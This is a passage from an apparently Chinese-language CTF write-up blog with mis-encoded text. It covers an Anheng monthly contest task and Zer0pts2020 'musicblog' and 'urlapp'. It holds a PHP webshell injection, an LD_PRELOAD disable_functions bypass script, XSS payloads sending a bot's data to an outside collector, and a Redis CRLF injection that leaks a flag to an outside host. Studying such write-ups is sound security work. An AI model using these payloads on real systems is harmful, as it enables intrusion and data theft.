<img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501185735317.png" alt="image-20200501185735317" style="zoom:150%;">

<p>è¿™é‡Œå°±æ˜¯ä¹‹å‰pç¥åˆ†äº«è¿‡çš„<a href="https://www.leavesongs.com/PENETRATION/thinking-about-config-file-arbitrary-write.html" target="_blank" rel="noopener">ç»å…¸å†™é…ç½®æ¼æ´ä¸å‡ ç§å˜å½¢</a>,é€šè¿‡</p>
<p>?shell=;eval($_POST[2333]);</p>
<p>?shell=$0</p>
<p>ä¹‹åå°±å¯ä»¥å¾—åˆ°shellï¼Œè¿ä¸Šèšå‰‘ï¼ŒæŸ¥çœ‹phpinfoï¼Œå¯ä»¥çœ‹åˆ°disable_function</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,error_log,dl,FFI::cdef,debug_backtrace,imap_mail,mb_send_mail</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°,èšå‰‘çš„æ‰€æœ‰æ’ä»¶éƒ½ä¸å¯ä»¥ç”¨ï¼Œè€Œä¸”open_basedirä¸º /var/www/html</p>
<p>å¯ä»¥ä½¿ç”¨globç»•è¿‡open_basedirè¯»è·Ÿç›®å½•æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($dh = opendir(<span class="string">'glob:///*'</span>)) &#123;</span><br><span class="line">	<span class="keyword">while</span> (($file = readdir($dh)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> $file.<span class="string">' '</span>;</span><br><span class="line">	&#125;</span><br><span class="line">  closedir($dh);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/////////////////////////////////////////////</span></span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span> ($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/////////////////////////////////////////////</span></span><br><span class="line">var_dump(scandir(<span class="string">'glob:///*'</span>));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200501222949625.png" alt="image-20200501222949625"></p>
<p>ä¹‹åé€šè¿‡gnupgæ¥ç»•è¿‡disable_function</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$cmd = $_GET[<span class="string">"cmd"</span>];</span><br><span class="line">$out_path = $_GET[<span class="string">"outpath"</span>];</span><br><span class="line">$evil_cmdline = $cmd . <span class="string">" &gt; "</span> . $out_path . <span class="string">" 2&gt;&amp;1"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: "</span> . $evil_cmdline . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">putenv(<span class="string">"EVIL_CMDLINE="</span> . $evil_cmdline);</span><br><span class="line"></span><br><span class="line">$so_path = $_GET[<span class="string">"sopath"</span>];</span><br><span class="line">putenv(<span class="string">"LD_PRELOAD="</span> . $so_path);</span><br><span class="line"></span><br><span class="line">$res = gnupg_init();</span><br><span class="line">gnupg_seterrormode($res,GNUPG_ERROR_WARNING);</span><br><span class="line">$info = gnupg_keyinfo($res,<span class="string">'your-key-id'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Key - Info&lt;pre&gt;"</span>;</span><br><span class="line">var_dump($info);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;"</span> . nl2br(file_get_contents($out_path)) . <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">unlink($out_path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ³¨ï¼šä»¥ä¸‹éƒ¨åˆ†åŠ ä¸Šåˆ·æ–°åä»å¯ç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gnupg_seterrormode($res,GNUPG_ERROR_WARNING);</span><br><span class="line">$info = gnupg_keyinfo($res,<span class="string">'your-key-id'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Key - Info&lt;pre&gt;"</span>;</span><br><span class="line">var_dump($info);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10010&#x2F;admin&#x2F;shells&#x2F;wFY2g1Ukgo8rdrUJ&#x2F;bypass_gnupg.php?cmd&#x3D;cat &#x2F;flag&amp;outpath&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;admin&#x2F;shells&#x2F;wFY2g1Ukgo8rdrUJ&#x2F;dd&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;admin&#x2F;shells&#x2F;wFY2g1Ukgo8rdrUJ&#x2F;bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure>

<p>ç„¶ågetflagã€‚</p>
<p><img src="/2020/05/01/2020%E5%B9%B4%E5%AE%89%E6%81%92%E5%9B%9B%E6%9C%88%E6%9C%88%E8%B5%9B/image-20200502083056197.png" alt="image-20200502083056197"></p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>Zer0pts2020 Writeup</title>
    <url>/2020/04/30/Zer0pts2020-musicblog/</url>
    <content><![CDATA[<p>strip_tags()å‡½æ•°bug</p>
<p>è®°å½•å¤ç°Zer0pts2020éƒ¨åˆ†é¢˜ç›®</p>
<a id="more"></a>

<h1 id="0x01-musicblog"><a href="#0x01-musicblog" class="headerlink" title="0x01 musicblog"></a>0x01 musicblog</h1><p>é¢˜ç›®ç»™äº†æºç ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹</p>
<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430231714733.png" alt="image-20200430231714733" style="zoom:200%;">

<p>æµ‹è¯•ç½‘ç«™å¯ä»¥æ³¨å†Œã€ç™»å½•ã€å‘å¸ƒblogç­‰ã€‚</p>
<p>çœ‹worker.jsæºç </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">'zer0pts&#123;&lt;censored&gt;&#125;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">'networkidle0'</span>,</span><br><span class="line">            timeout: <span class="number">10</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> page.click(<span class="string">'#like'</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œcrawlå‡½æ•°ä¼šå°†flagæ”¾åˆ°User-Agentä¸­ï¼Œå¯¼èˆªåˆ°urlï¼Œç„¶åç‚¹å‡»idä¸ºlikeçš„æ ‡ç­¾ã€‚æ‰€ä»¥å¯ä»¥ç¡®å®šä¸ºxssäº†ã€‚</p>
<p>ç„¶åé˜…è¯»æºç ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'util.php'</span>;</span><br><span class="line"></span><br><span class="line">$nonce = get_nonce();</span><br><span class="line">header(<span class="string">"Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'nonce-$&#123;nonce&#125;' 'strict-dynamic'; base-uri 'none'; trusted-types"</span>);</span><br><span class="line">header(<span class="string">'X-Frame-Options: DENY'</span>);</span><br><span class="line">header(<span class="string">'X-XSS-Protection: 1; mode=block'</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®äº†cspï¼Œæ— æ³•è·¨åŸŸè¯·æ±‚ï¼Œä¸”jså¿…é¡»å…·æœ‰$nonceå€¼æ‰èƒ½è¢«åŠ è½½æ‰§è¡Œï¼Œç„¶åå¯»æ‰¾å¯ä»¥è§¦å‘xssçš„åœ°æ–¹ï¼Œbotä¼šç‚¹å‡»idä¸ºlikeçš„æ ‡ç­¾ï¼Œåœ¨è®¿é—®post.php?id=xxæ—¶</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430233401847.png" alt="image-20200430233401847"></p>
<p>å…·æœ‰likeçš„æ ‡ç­¾ï¼Œå¯çŸ¥botä¼šå®šæ—¶è®¿é—®post.phpé¡µé¢ï¼Œåœ¨postæ—¶</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430233540707.png" alt="image-20200430233540707"></p>
<p>ä¼šå°†<code>[[URL]]</code>è½¬æ¢æˆ<code>&lt;audio src=&quot;URL&quot;&gt;&lt;/audio&gt;</code>,å¹¶ä¸”ç‚¹å‡»ä¸Šå›¾æ¡†ä¸­é€‰é¡¹ï¼Œbotä¼šcheck your post,ç¡®å®šxssã€‚</p>
<p>ç„¶åçœ‹æºç é‡Œå¯¹<code>[[URL]]</code>çš„å¤„ç†ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// [[URL]] â†’ &lt;audio src="URL"&gt;&lt;/audio&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">'/\[\[(.+?)\]\]/'</span>, <span class="string">'&lt;audio controls src="\\1"&gt;&lt;/audio&gt;'</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">'&lt;audio&gt;'</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æŸ¥æ‰¾èµ„æ–™å¯ä»¥æ‰¾åˆ°strip_tags()å‡½æ•°æœ‰bugã€‚</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430233936071.png" alt="image-20200430233936071"></p>
<p><a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a></p>
<p>ä¹Ÿå°±æ˜¯ä¸ä¼šè¿‡æ»¤<code>&lt;a/udio&gt;</code>ï¼Œå¹¶ä¸”<code>&lt;a/udio&gt;</code>ä¼šä½œä¸º è¶…é“¾æ¥<code>&lt;a&gt;</code>è¢«è§£æï¼Œè€Œè¶…é“¾æ¥çš„è·³è½¬æ˜¯ä¸å—<strong>CSPé™åˆ¶</strong>çš„ã€‚</p>
<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430234206184.png" alt="image-20200430234206184" style="zoom:200%;">

<p>ç„¶ååœ¨postæ—¶å°†contentè®¾ç½®ä¸ºå¦‚ä¸‹payload</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;a/udio  href=<span class="string">"http://xss.buuoj.cn/index.php?do=api&amp;id=UrvHLW"</span> id=like&gt;x&lt;<span class="regexp">/a/u</span>dio&gt;</span><br><span class="line">or</span><br><span class="line">[[<span class="string">"&gt;&lt;/audio&gt;&lt;a/udio href="</span>http:<span class="comment">//xss.buuoj.cn/index.php?do=api&amp;id=UrvHLW" id=like&gt;test&lt;/a/udio&gt;&lt;audio a="]]</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501000509269.png" alt="image-20200501000509269"></p>
<p>å¯ä»¥çœ‹åˆ°å·²ç»æ·»åŠ äº†åˆ°xsså¹³å°çš„æ ‡ç­¾ã€‚</p>
<ul>
<li>ç¬¬ä¸€ä¸ªpayload</li>
</ul>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501000449539.png" alt="image-20200501000449539"></p>
<ul>
<li>ç¬¬äºŒä¸ªpayload</li>
</ul>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430235654042.png" alt="image-20200430235654042"></p>
<p>ç„¶åå¯å¾—flagã€‚</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200430235007637.png" alt="image-20200430235007637"></p>
<h1 id="0x02-urlapp"><a href="#0x02-urlapp" class="headerlink" title="0x02 urlapp"></a>0x02 urlapp</h1><p>é¢˜ç›®æºç </p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'sinatra'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'uri'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">()</span></span></span><br><span class="line">  sock = TCPSocket.open(<span class="string">"redis"</span>, <span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> ping(sock) <span class="keyword">then</span></span><br><span class="line">    exit</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sock</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(sock, cmd)</span></span></span><br><span class="line">  sock.write(cmd + <span class="string">"\r\n"</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">(sock)</span></span></span><br><span class="line">  data = sock.gets</span><br><span class="line">  <span class="keyword">if</span> data == <span class="literal">nil</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">  <span class="keyword">elsif</span> data[<span class="number">0</span>] == <span class="string">"+"</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> data[<span class="number">1</span>..-<span class="number">1</span>].strip</span><br><span class="line">  <span class="keyword">elsif</span> data[<span class="number">0</span>] == <span class="string">"$"</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> data == <span class="string">"$-1\r\n"</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> sock.gets.strip</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span><span class="params">(sock)</span></span></span><br><span class="line">  query(sock, <span class="string">"ping"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">"PONG"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(sock, key, value)</span></span></span><br><span class="line">  query(sock, <span class="string">"SET <span class="subst">#&#123;key&#125;</span> <span class="subst">#&#123;value&#125;</span>"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock) == <span class="string">"OK"</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span class="string">"GET <span class="subst">#&#123;key&#125;</span>"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">"flag"</span>, File.read(<span class="string">"flag.txt"</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">'index.html'</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">"H*"</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">"<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>"</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>å®¡è®¡æºç åå¯ä»¥å¾—åˆ°ä»£ç çš„é€»è¾‘ï¼Œé¦–å…ˆä¼šæŠŠflag.txtæ–‡ä»¶çš„å†…å®¹ï¼Œä¿å­˜åˆ°redisæ•°æ®åº“ä¸­ï¼Œå¯¹åº”çš„é”®ä¸ºflagï¼Œç„¶åæœ‰ä¸ªæ”¹å˜urlé•¿åº¦çš„åŠŸèƒ½ï¼Œpostä¼ å…¥ä¸€ä¸ªurlï¼Œç„¶åæ£€æµ‹urlï¼Œä¹‹åå°†urlå­˜å‚¨åˆ°redisæ•°æ®åº“ä¸­ï¼Œå¯¹åº”çš„é”®ä¸ºéšæœºç”Ÿæˆçš„8ä½å­—ç¬¦çš„åå…­è¿›åˆ¶ï¼Œç„¶åè¾“å‡ºå¯¹åº”çš„é”®ï¼Œ</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501130254421.png" alt="image-20200501130254421"></p>
<p>ç„¶åè®¿é—®ä¸Šå›¾æ¡†ä¸­çš„åœ°å€ï¼ŒæœåŠ¡ç«¯ä¼šè·³è½¬åˆ°ä¸Šé¢çš„é“¾æ¥ã€‚</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501133518039.png" alt="image-20200501133518039"></p>
<p>æœåŠ¡ç«¯é¦–å…ˆæ£€æµ‹qï¼Œæ˜¯å¦ä¸º16ä½[0-9a-f]çš„å­—ç¬¦ï¼Œ</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501133638134.png" alt="image-20200501133638134"></p>
<p>ç„¶åæŸ¥qå¯¹åº”çš„å€¼ï¼Œç„¶åé‡å®šå‘åˆ°urlã€‚</p>
<p>redirect:</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501135806818.png" alt="image-20200501135806818"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rename-command AUTH &quot;&quot;</span><br><span class="line">rename-command RENAME &quot;&quot;</span><br><span class="line">rename-command RENAMENX &quot;&quot;</span><br><span class="line">rename-command FLUSHDB &quot;&quot;</span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command MULTI &quot;&quot;</span><br><span class="line">rename-command EXEC &quot;&quot;</span><br><span class="line">rename-command DISCARD &quot;&quot;</span><br><span class="line">rename-command WATCH &quot;&quot;</span><br><span class="line">rename-command UNWATCH &quot;&quot;</span><br><span class="line">rename-command SUBSCRIBE &quot;&quot;</span><br><span class="line">rename-command UNSUBSCRIBE &quot;&quot;</span><br><span class="line">rename-command PUBLISH &quot;&quot;</span><br><span class="line">rename-command SAVE &quot;&quot;</span><br><span class="line">rename-command BGSAVE &quot;&quot;</span><br><span class="line">rename-command LASTSAVE &quot;&quot;</span><br><span class="line">rename-command SHUTDOWN &quot;&quot;</span><br><span class="line">rename-command BGREWRITEAOF &quot;&quot;</span><br><span class="line">rename-command INFO &quot;&quot;</span><br><span class="line">rename-command MONITOR &quot;&quot;</span><br><span class="line">rename-command SLAVEOF &quot;&quot;</span><br><span class="line">rename-command CONFIG &quot;&quot;</span><br><span class="line">rename-command CLIENT &quot;&quot;</span><br><span class="line">rename-command CLUSTER &quot;&quot;</span><br><span class="line">rename-command DEBUG &quot;&quot;</span><br><span class="line">rename-command EVAL &quot;&quot;</span><br><span class="line">rename-command EVALSHA &quot;&quot;</span><br><span class="line">rename-command PSUBSCRIBE &quot;&quot;</span><br><span class="line">rename-command PUBSUB &quot;&quot;</span><br><span class="line">rename-command READONLY &quot;&quot;</span><br><span class="line">rename-command READWRITE &quot;&quot;</span><br><span class="line">rename-command SCRIPT &quot;&quot;</span><br><span class="line">rename-command REPLICAOF &quot;&quot;</span><br><span class="line">rename-command SYNC &quot;&quot;</span><br><span class="line">rename-command PSYNC &quot;&quot;</span><br><span class="line">rename-command WAIT &quot;&quot;</span><br><span class="line">rename-command LATENCY &quot;&quot;</span><br><span class="line">rename-command MEMORY &quot;&quot;</span><br><span class="line">rename-command MODULE &quot;&quot;</span><br><span class="line">rename-command MIGRATE &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨redisçš„é…ç½®æ–‡ä»¶é‡Œç¦äº†ä¸Šé¢çš„å‘½ä»¤ï¼Œç†æ¸…ä»£ç é€»è¾‘åæˆ‘ä»¬å¯ä»¥æ¸…æ¥šæˆ‘ä»¬çš„æ”»å‡»æ€è·¯ï¼Œå…¶å®å°±æ˜¯é€šè¿‡è·å–redisæ•°æ®åº“ä¸­é”®ä¸ºflagå¯¹åº”çš„å€¼ã€‚</p>
<ul>
<li>æ–¹æ³•ä¸€</li>
</ul>
<p>é€šè¿‡BITOP<a href="https://redis.io/commands/bitop" target="_blank" rel="noopener">å‘½ä»¤</a>å’ŒBITFIELD<a href="https://redis.io/commands/bitfield" target="_blank" rel="noopener">å‘½ä»¤</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;</span><br><span class="line">BITOP AND 2f2f2f2f2f2f2f2b flag flag</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·è®¾ç½®ï¼Œç„¶åè®¿é—®q=2f2f2f2f2f2f2f2bï¼Œè¿”å›404ï¼Œç„¶åæŸ¥æ‰¾åŸå› å¾—çŸ¥</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501133638134.png" alt="image-20200501133638134"></p>
<p>æ˜¯è¿™é‡Œredirectçš„åŸå› ï¼Œç„¶åå‚è€ƒ</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501141636854.png" alt="image-20200501141636854"></p>
<p>è¿™é‡Œï¼Œéœ€è¦æŠŠurlå˜æˆå¸¦æœ‰?çš„é“¾æ¥ã€‚</p>
<p>BITFIELDå‘½ä»¤å¯ä»¥è®¾ç½®æŒ‡å®šä½åŸŸçš„å€¼ã€‚</p>
<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501141937654.png" alt="image-20200501141937654" style="zoom:150%;">

<p>å¯ä»¥è®¾ç½®ä»»æ„ä½ã€‚</p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501140017042.png" alt="image-20200501140017042"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;</span><br><span class="line">BITOP AND 2f2f2f2f2f2f2f2b flag flag</span><br><span class="line">BITFIELD 2f2f2f2f2f2f2f2b SET u8 #4 63</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501140158217.png" alt="image-20200501140158217"></p>
<ul>
<li>æ–¹æ³•äºŒ</li>
</ul>
<p>é€šè¿‡BITOPå‘½ä»¤å’ŒSETBIT<a href="https://redis.io/commands/setbit" target="_blank" rel="noopener">å‘½ä»¤</a></p>
<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501140628667.png" alt="image-20200501140628667" style="zoom:200%;">

<p>flag{}ä¸1å¼‚æˆ–ç¬¬ä¸€ä½ä¸ºW</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">W	0101 0111</span><br><span class="line">? 	0011 1111</span><br><span class="line">éœ€è¦ä¿®æ”¹ ç¬¬ 1ã€2ã€4ä½ã€‚</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501140342693.png" alt="image-20200501140342693"></p>
<p><img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501142107776.png" alt="image-20200501142107776"></p>
<ul>
<li>æ–¹æ³•ä¸‰</li>
</ul>
<img src="/2020/04/30/Zer0pts2020-musicblog/image-20200501142904135.png" alt="image-20200501142904135" style="zoom:150%;">

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Request 1</span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 3.112.201.75:8004</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 117</span><br><span class="line"></span><br><span class="line">url&#x3D;http:&#x2F;&#x2F;rwx.kr</span><br><span class="line">eval &quot;redis.call(&#39;set&#39;,&#39;e41cf0f94e050661&#39;,&#39;http:&#x2F;&#x2F;rwx.kr?&#39;..redis.call(&#39;get&#39;,&#39;flag&#39;));return 1;&quot; 0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Request 2</span><br><span class="line">GET &#x2F;?q&#x3D;e41cf0f94e050661 HTTP&#x2F;1.1</span><br><span class="line">Host: 3.112.201.75:8004</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 302 Found</span><br><span class="line">Content-Type: text&#x2F;html;charset&#x3D;utf-8</span><br><span class="line">Location: http:&#x2F;&#x2F;rwx.kr?zer0pts&#123;sh0rt_t0_10ng_10ng_t0_sh0rt&#125;</span><br><span class="line">Content-Length: 